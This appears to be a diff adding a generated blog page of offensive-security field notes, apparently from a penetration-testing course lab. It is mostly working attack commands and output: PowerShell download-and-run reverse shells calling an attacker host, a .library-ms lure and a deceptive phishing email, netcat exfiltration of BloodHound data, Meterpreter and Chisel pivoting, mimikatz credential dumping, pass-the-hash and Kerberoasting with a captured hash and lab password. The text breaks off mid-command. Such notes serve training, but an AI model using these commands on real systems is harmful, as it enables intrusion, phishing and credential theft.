@@ -1,0 +1,1093 @@
+
+    <article class="git-panel git-file-panel" data-git-panel-section="blob">
+      <header class="git-file-header">
+        <h4 class="git-file-title">operator-shells.html</h4>
+        <div class="git-file-meta">
+          <span>47 KB</span>
+          <span>site-output/blog/operator-shells.html</span>
+        </div>
+      </header>
+      <div class="git-file-body">
+        <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+  &lt;title&gt;Core – OffSec Field Notes — Shells and Tradecraft Snippets&lt;/title&gt;
+
+  
+    &lt;!-- head partial (auto-generated) --&gt;
+
+&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=5.0, viewport-fit=cover&quot;/&gt;
+&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.googleapis.com&quot;&gt;
+&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.gstatic.com&quot; crossorigin&gt;
+&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Audiowide&amp;family=Orbitron:wght@400..900&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Rubik+Iso&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../assets/static/style/cm.css&quot;&gt;
+&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.googleapis.com&quot;&gt;
+&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.gstatic.com&quot; crossorigin&gt;
+&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Syne+Mono&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;../assets/static/js/cm.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;https://unpkg.com/htmx.org@1.9.12&quot; defer&gt;&lt;/script&gt;
+&lt;link rel=&quot;manifest&quot; href=&quot;../site.webmanifest&quot;/&gt;
+&lt;link rel=&quot;icon&quot; type=&quot;image/x-icon&quot; href=&quot;../assets/static/img/favicon.ico&quot;&gt;
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+
+&lt;/head&gt;
+&lt;body class=&quot;cm-body blog-page&quot;&gt;
+  &lt;header&gt;
+    &lt;div class=&quot;container header-container&quot;&gt;
+      
+      
+      
+        &lt;a href=&quot;../index.html&quot; class=&quot;logo-link&quot;&gt;
+          &lt;img src=&quot;../assets/static/img/not-dead.webp&quot; alt=&quot;Core Logo&quot; class=&quot;logo&quot;&gt;
+        &lt;/a&gt;
+      
+      
+      
+        &lt;button type=&quot;button&quot; class=&quot;nav-toggle&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+          &lt;svg width=&quot;24&quot; height=&quot;24&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot;&gt;
+            &lt;path d=&quot;M3 7h18M3 12h18M3 17h18&quot; /&gt;
+          &lt;/svg&gt;
+        &lt;/button&gt;
+        &lt;nav class=&quot;main-nav&quot;&gt;
+          &lt;ul class=&quot;nav-links&quot;&gt;
+            
+              &lt;li&gt;&lt;a href=&quot;../index.html&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+            
+              &lt;li&gt;&lt;a href=&quot;../blog.html&quot;&gt;Blog&lt;/a&gt;&lt;/li&gt;
+            
+          &lt;/ul&gt;
+        &lt;/nav&gt;
+      
+    &lt;/div&gt;
+  &lt;/header&gt;
+
+  &lt;main class=&quot;blog-container blog-post-view&quot;&gt;
+    &lt;div class=&quot;blog-article-shell&quot;&gt;
+      &lt;a class=&quot;blog-back-link&quot; href=&quot;../blog.html&quot;&gt;
+        &lt;svg viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; aria-hidden=&quot;true&quot;&gt;
+          &lt;path d=&quot;M15 18l-6-6 6-6&quot; /&gt;
+        &lt;/svg&gt;
+        Back to Chaos &amp;amp; Majesty Journal
+      &lt;/a&gt;
+      
+
+&lt;article class=&quot;blog-article-body&quot; data-slug=&quot;operator-shells&quot;&gt;
+  &lt;header class=&quot;blog-article-header&quot;&gt;
+    &lt;h1 class=&quot;blog-article-title&quot;&gt;OffSec Field Notes — Shells and Tradecraft Snippets&lt;/h1&gt;
+    &lt;p class=&quot;blog-article-meta&quot;&gt;
+      
+        &lt;span&gt;Aug 31, 2023&lt;/span&gt;
+      
+      
+        &lt;span aria-hidden=&quot;true&quot;&gt;•&lt;/span&gt;
+        &lt;span&gt;20 min read&lt;/span&gt;
+      
+      
+        &lt;span aria-hidden=&quot;true&quot;&gt;•&lt;/span&gt;
+        &lt;span&gt;m4xx3d0ut&lt;/span&gt;
+      
+    &lt;/p&gt;
+  &lt;/header&gt;
+
+  
+
+  &lt;div class=&quot;blog-article-content&quot;&gt;
+    &lt;h2&gt;TLDR;&lt;/h2&gt;
+&lt;p&gt;This cheat sheet now captures the extra context from the raw notes: when to use each command, expected output, and follow-up actions.&lt;/p&gt;
+&lt;h3&gt;Recon &amp;amp; Enumeration&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;# Full TCP sweep with service scripts
+sudo nmap -sC -sV -oA scans/$TARGET $TARGET_IP
+
+# Directory brute force with file extension permutations
+gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt -x txt,pdf,config,php,bak -o scans/$TARGET-gobuster.txt
+
+# Stack fingerprinting
+whatweb http://$TARGET_IP
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Log discovered hosts in &lt;code&gt;loot/hosts.csv&lt;/code&gt; with service notes.&lt;/p&gt;
+&lt;h3&gt;Exploit Preparation&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;# Search Exploit-DB locally
+searchsploit $SERVICE_NAME
+
+# Convert SSH key for cracking
+ssh2john ~/.ssh/id_rsa &amp;gt; loot/ssh.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo loot/ssh.hash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Document cracked credentials with timestamps and rotation status.&lt;/p&gt;
+&lt;h3&gt;Local Enumeration&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;# Linux quick hits
+linpeas.sh | tee loot/linpeas-$(hostname).log
+hostname
+id
+ip -a
+
+# Windows quick hits
+winPEASx64.exe &amp;gt; loot/winpeas-$(hostname).log
+systeminfo
+whoami /all
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Flag potential privesc leads (SUID, service paths, interesting credentials) in your tracker.&lt;/p&gt;
+&lt;h3&gt;SMB &amp;amp; WebDAV&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;crackmapexec smb $TARGET_IP -u john -p &amp;quot;$PASS&amp;quot; --shares
+wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r $(pwd)/webdav
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Use WebDAV to stage payloads for &lt;code&gt;.library-ms&lt;/code&gt; lures or WebShells; record URLs.&lt;/p&gt;
+&lt;h3&gt;Payload Delivery Snippets&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;# Windows library-ms template (trimmed)
+&amp;lt;libraryDescription&amp;gt;...
+    &amp;lt;url&amp;gt;http://$KALI_IP&amp;lt;/url&amp;gt;
+&amp;lt;/libraryDescription&amp;gt;
+
+# PowerShell reverse shell launcher
+powershell.exe -nop -w hidden -c &amp;quot;IEX(New-Object System.Net.WebClient).DownloadString(&amp;#39;http://$KALI_IP:8000/powercat.ps1&amp;#39;); powercat -c $KALI_IP -p $KALI_PORT -e powershell&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Annotate payload hashes and detections encountered.&lt;/p&gt;
+&lt;h3&gt;Operator Quality of Life&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nc -nvlp 4444
+Start-Process -NoNewWindow .\metrtcp.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Pair listeners with session logging (&lt;code&gt;script&lt;/code&gt;, &lt;code&gt;tmux capture-pane&lt;/code&gt;) so you can recover commands later.&lt;/p&gt;
+&lt;h3&gt;AD Enumeration &amp;amp; Exfil&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;# BloodHound collection
+Invoke-BloodHound -CollectionMethod All,LoggedOn,GPOLocalGroup -Domain corp.local -ZipFile .\loot\BH.zip
+
+# Transfer data home
+nc -lp 4445 &amp;gt; bloodhound.zip
+.\nc.exe -w 3 192.168.45.163 4445 &amp;lt; BloodHound.zip
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Record collection times, file hashes, and transfer commands to maintain chain-of-custody.&lt;/p&gt;
+&lt;p&gt;Keep this sheet close, annotate it as you learn, and fold discoveries back into your playbooks.&lt;/p&gt;
+&lt;h2&gt;Working Notes... In Graphic Detail...&lt;/h2&gt;
+&lt;h3&gt;Pentest Methodology&lt;/h3&gt;
+&lt;p&gt;Port scanning&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo nmap -sC -sV -oN $TARGET/nmap $TARGET_IP
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Directory enumeration&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Web app identification&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;whatweb http://$TARGET_IPhttps://github.com/picocms/Pico
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;WordPress scan&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;wpscan --url http://$TARGET_IP --enumerate p --plugins-detection aggressive -o websrv1/wpscan
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Search for public exploits&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;searchsploit $SVC_OR_PLGIN_NAME
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Crack SSH key passphrases&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ssh2john $KEY_FILE &amp;gt; ssh.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Local enumeration&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Linux
+linpeas.sh
+hostname
+id
+ip -a
+# Windows
+winPEASx64.exe
+    /Basic System Information
+    /AV Information
+    /Network Ifaces and known hosts
+systeminfo
+ipconfig
+hostname
+whoami
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;SMB enumeration&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;crackmapexec smb $TARGET_IP -u john -p &amp;quot;$PASSWD&amp;quot; --shares
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Anon WebDAV share&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r $(pwd)/webdav
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Windows Library file &lt;code&gt;*.library-ms&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
+&amp;lt;libraryDescription xmlns=&amp;quot;http://schemas.microsoft.com/windows/2009/library&amp;quot;&amp;gt;
+&amp;lt;name&amp;gt;@windows.storage.dll,-34582&amp;lt;/name&amp;gt;
+&amp;lt;version&amp;gt;6&amp;lt;/version&amp;gt;
+&amp;lt;isLibraryPinned&amp;gt;true&amp;lt;/isLibraryPinned&amp;gt;
+&amp;lt;iconReference&amp;gt;imageres.dll,-1003&amp;lt;/iconReference&amp;gt;
+&amp;lt;templateInfo&amp;gt;
+&amp;lt;folderType&amp;gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&amp;lt;/folderType&amp;gt;
+&amp;lt;/templateInfo&amp;gt;
+&amp;lt;searchConnectorDescriptionList&amp;gt;
+&amp;lt;searchConnectorDescription&amp;gt;
+&amp;lt;isDefaultSaveLocation&amp;gt;true&amp;lt;/isDefaultSaveLocation&amp;gt;
+&amp;lt;isSupported&amp;gt;false&amp;lt;/isSupported&amp;gt;
+&amp;lt;simpleLocation&amp;gt;
+&amp;lt;url&amp;gt;http://$KALI_IP&amp;lt;/url&amp;gt;
+&amp;lt;/simpleLocation&amp;gt;
+&amp;lt;/searchConnectorDescription&amp;gt;
+&amp;lt;/searchConnectorDescriptionList&amp;gt;
+&amp;lt;/libraryDescription&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Windows shortcut to download PowerCat reverse shell payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;powershell.exe -c &amp;quot;IEX(New-Object System.Net.WebClient).DownloadString(&amp;#39;http://$KALI_IP:8000/powercat.ps1&amp;#39;); powercat -c $KALI_IP -p $KALI_PORT -e powershell&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Netcat listener&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nc -nvlp 4444
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Swaks email phishing&lt;/strong&gt;
+Create &lt;code&gt;body.txt&lt;/code&gt; with pretext, example:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Hey!
+I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I&amp;#39;ll remove it for security reasons.
+
+On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!
+
+John
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;This may convince our target to open the attachment.&lt;ul&gt;
+&lt;li&gt;&lt;em&gt;In a real assessment we should also use passive information gathering techniques to obtain more information about a potential target. Based on this information, we could create more tailored emails and improve our chances of success tremendously.&lt;/em&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Build command&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo swaks -t $VALID_RECIPIENT_0 -t $VALID_RECIPIENT_1 --from $VALID_EMAIL_ADDRESS --attach @config.Library-ms --server $MAIL_SRV_IP --body @body.txt --header &amp;quot;Subject: Staging Script&amp;quot; --suppress-data -ap
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;AD Enumeration&lt;/strong&gt;
+Upload SharpHound collector.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;iwr -uri http://$KALI_IP:8000/SharpHound.ps1 -Outfile SharpHound.ps1
+. .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Transfer to Kali&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Kali
+nc -lp 4445 &amp;gt; bloodhound.zip
+# Target
+.\nc.exe -w 3 192.168.45.163 4445 &amp;lt; BloodHound.zip
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Start &lt;code&gt;neo4j&lt;/code&gt;, &lt;code&gt;bloodhound&lt;/code&gt;, and &amp;quot;upload data&amp;quot;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo neo4j start
+bloodhound &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Basic enumeration raw queries&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Display domain connected computers
+MATCH (m:Computer) RETURN m
+# Display domain users
+MATCH (m:User) RETURN m
+# Display active user sessions
+MATCH p = (c:Computer)-[:HasSession]-&amp;gt;(m:User) RETURN p
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Detact PowerShell Process&lt;/strong&gt;
+Will not die if original shell fails&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Start-Process -NoNewWindow .\metrtcp.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Meterpreter Autoroute &amp;amp; SOCKS5 Proxy&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msf6 &amp;gt; use multi/manage/autoroute
+msf6 post(multi/manage/autoroute) &amp;gt; set session 1
+session =&amp;gt; 1
+msf6 post(multi/manage/autoroute) &amp;gt; run
+msf6 post(multi/manage/autoroute) &amp;gt; use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) &amp;gt; set SRVHOST 127.0.0.1
+SRVHOST =&amp;gt; 127.0.0.1
+msf6 auxiliary(server/socks_proxy) &amp;gt; set VERSION 5
+VERSION =&amp;gt; 5
+msf6 auxiliary(server/socks_proxy) &amp;gt; run -j
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Meterpreter Migrate&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;execute -H -f notepad.exe
+(proc created 1500)
+migrate 1500
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With the SOCKS5 proxy active we can configure proxychains to access the internal network.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;socks5          127.0.0.1 1080
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;SMB Credential Spray Internal Network via Proxy&lt;/strong&gt;
+Example:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo proxychains -q crackmapexec smb 172.16.87.240-241 172.16.87.254 -u john -d beyond.com -p &amp;quot;dqsTwTpZPn#nL&amp;quot; --shares
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Nmap Internal Network via Proxy&lt;/strong&gt;
+Example:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo proxychains -q nmap -sT -oN internal-servers.nmap -Pn -p 21,80,443 172.16.87.240 172.16.87.241 172.16.87.254
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Chisel Proxy Connections&lt;/strong&gt;
+&lt;a href=&quot;https://github.com/jpillora/chisel&quot;&gt;Chisel&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ gunzip chisel_1.9.0_linux_amd64.gz
+
+┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ mv chisel_1.9.0_linux_amd64 chisel
+
+┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ file chisel
+chisel: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=jGqNcOxUVIlhmjt2owNC/py0c32hpuO79Sykl3kHD/FZVs4pG8bg5V4LUlZY9Y/lFf4TEBORjLxICoiMGrZ, stripped
+
+┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ chmod a+x chisel
+
+┌──(operator㉿labhost)-[~/OffSec/beyond]dcom ports
+└─$ ./chisel server --port 8080 --reverse
+2023/12/30 13:53:39 server: Reverse tunnelling enabled
+2023/12/30 13:53:39 server: Fingerprint vUZ4fX/iMvelnGlgbmMUxddmoyO2m1/D7/9Hy8gKbQ4=
+2023/12/30 13:53:39 server: Listening on http://0.0.0.0:8080
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;From our target shell we can run Chisel in client mode to connect back to Kali on port 8080 by creating a reverse port forward with syntax &lt;code&gt;R:localport:remotehost:remoteport&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; shell
+Process 7884 created.
+Channel 55 created.
+Microsoft Windows [Version 10.0.22000.978]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\marcus&amp;gt;chisel.exe client 192.168.45.163:8080 R:80:172.16.87.241:80
+chisel.exe client 192.168.45.163:8080 R:80:172.16.87.241:80
+2023/12/30 14:10:54 client: Connecting to ws://192.168.45.163:8080
+2023/12/30 14:10:55 client: Connected (Latency 78.2679ms)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Bind INTERNALSRV1 port 80 to Kali port 80.&lt;ul&gt;
+&lt;li&gt;&lt;em&gt;NOTE: kill wsgidav server first&lt;/em&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ ./chisel server --port 8080 --reverse
+2023/12/30 14:03:01 server: Reverse tunnelling enabled
+2023/12/30 14:03:01 server: Fingerprint D8xrjq850tcudK3gJ2HmABSmOEjGVwsL1TpTmahCJWo=
+2023/12/30 14:03:01 server: Listening on http://0.0.0.0:8080
+2023/12/30 14:10:55 server: session#36: tun: proxy#R:81=&amp;gt;172.16.87.241:80: Listening
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;With chisel connected wr can browse to port 80 on 172.16.87.241 via port 81 of Kali localhost with Firefox.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Mimikatz Cached Creds&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Lateral Movement via Impacket-psexec&lt;/strong&gt;
+Example:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;proxychains -q impacket-psexec -hashes :f0397ec5af49971f6efbdb07877046b3 beccy@172.16.81.240
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Kerberoasting with Impacket&lt;/strong&gt;
+We can Kerberoasting from Kali with &lt;code&gt;impacket-GetUserSPNs&lt;/code&gt; over our SOCKS5 proxy.  To obtain the TGS-REP hash of &lt;code&gt;daniela&lt;/code&gt; we need to provide the creds of a domain user, so we will use &lt;code&gt;john&lt;/code&gt;.
+Example:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.87.240 beyond.com/john
+
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon                   Delegation
+----------------------------  -------  --------  --------------------------  --------------------------  ----------
+http/internalsrv1.beyond.com  daniela            2022-09-29 01:17:20.062328  2022-10-05 00:59:48.376728
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$c1939af6eee8a400b1ec41e96289cbf2$14d33d1eaa975da1b090c3de10c70319f6fc59c3ab31a35e956601901575a2d697baaef3d2147bfd4dae43aab19ed82300ed47ccf9925cd246711ebedbc9635fa876b85131b4b3fa11386393a59f4a8c58c69cfbe947959953fafb08a73032b382cc911daa1860e411099e12c42d49568e0410115bf6d841a7b0b8876dd4449ee94e87f48112504b419c3f6ba64edba7cc2c2e16147a8996524ea98f4a56cd7c19a017cf5f212c9292a8d12ca314e996e13da71800715b6a922379d50deceac9ca0c101f2282c3168e9b10adadccfa63740de5c2d819aba279919272163d4041246d7eaf4cfed29379b3b3e557b12a0427819280fa71a4c2e02eb8c4435be17554b2ff6014919ca6da594fed553be047470379133ab689886a31b8d9090ef1a8c221e2a99b912a6b331ab86bb9f398655f2880a096fb40fd7f498bea77acda21b83bb762c3ebd2ee40acf25e9a3aa8d770e0997f1635cd0e3c02dbe6b1956defcb0dca884248190a5e67c077c2d8c042c94fcc9c5122ccf9996693ddaec616828d83bf2dcc8f923f368fe542f04c4dfd03d8bbf31c96e65d971ea6f991a2def70bd04e2313225bcc3aa5380c40525d055ed28f817208d0bfc690916ef509f0bc147045132e7bb08f963e624ee48b0cf5c0160dddb9c496e23ac8b5a3f10c65a91f1225ada552d40af5503966e49e9f15993b8ac98b6d8a3c532c9b8909ea7f8338930f312cf295b0012bd92da3ee44404234f53123f25070b9531d1fbdf50bf04724748b07326b999117b6f7c93dd89b474ee63cbcf40fd2843739e49e16d25df66d6c6daf727479378667178c89de6d11be01e5a0d91dfa4b44ae77d8764be7e44058f24a85d3ab9046ce87933e2d3a7aba23e3c6a850e5390f10f3a343a5bdff3754be06719d5a8e83218b6330513db0f9d3d38c04b9007290c9bf00d8b80be650fa407205734978b0cbe11dadd3dce07c258f63db8f7154c181b449d6c10312e6c83d34ff46ecc500bbb2c298232963abb2f889e4423a702486d91d5b1edabc4603029f69d9afea5572c83edf911a044e867bc098368d49be3164346d3906197e46c761b511038e10ede277eb90d6be09569c7c45c344f011e1142d3b4b5ee05678f487e4c01295cfe7b1bc9022ca0af9ecee463d75370d190156e9915b286e3f811ac8b27ef6ac69c166fb02947c5303e760e840849d7259980eabc8d33df0d27b4555ca57bfb8b1dca91bf957a1d8c9b8facac0a23ef05355f54d27f35255e551ac8aa76e37b9be40aa1b4df5ccb5d5b71e12025b844782c36a44dd71d3a174373c9a776e4f0cfdcbf36445edd105291212101cd71de93b8d56882727
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Store the hash to &lt;code&gt;daniela.hash&lt;/code&gt; an crack with Hashcat.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Impacket SMB Relay Attack&lt;/strong&gt;
+Can be utilized in any case where an auth request can be forced:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Web app backup plugin path.&lt;/li&gt;
+&lt;li&gt;SMB requests.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;First we need to setup the &lt;code&gt;impacket-ntlmrelayx&lt;/code&gt; before we modify the backup directory path of the WP plugin.  Use &lt;code&gt;--no-http-server&lt;/code&gt; and &lt;code&gt;-smb2support&lt;/code&gt; to disable the HTTP server and enable SMB2 support.  We need to specify the external address of MAILSRV1 as the target of our relay attack, so we won&amp;#39;t have to proxy via proxychains.  We&amp;#39;ll also base64-encode the PowerShell reverse shell &lt;a href=&quot;https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3&quot;&gt;oneliner&lt;/a&gt; to connect back to our attacking system on port 9999 and provide it as a command to &lt;code&gt;-c&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# PowerShell One-liner
+
+┌──(operator㉿labhost)-[/home/operator/OffSec/beyond]
+└─PS&amp;gt; $Text = &amp;#39;$client = New-Object System.Net.Sockets.TCPClient(&amp;quot;192.168.45.163&amp;quot;,9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &amp;quot;PS &amp;quot; + (pwd).Path + &amp;quot;&amp;gt; &amp;quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&amp;#39;
+
+┌──(operator㉿labhost)-[/home/operator/OffSec/beyond]
+└─PS&amp;gt; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+
+┌──(operator㉿labhost)-[/home/operator/OffSec/beyond]
+└─PS&amp;gt; $EncodedText =[Convert]::ToBase64String($Bytes)
+
+┌──(operator㉿labhost)-[/home/operator/OffSec/beyond]
+└─PS&amp;gt; $EncodedText
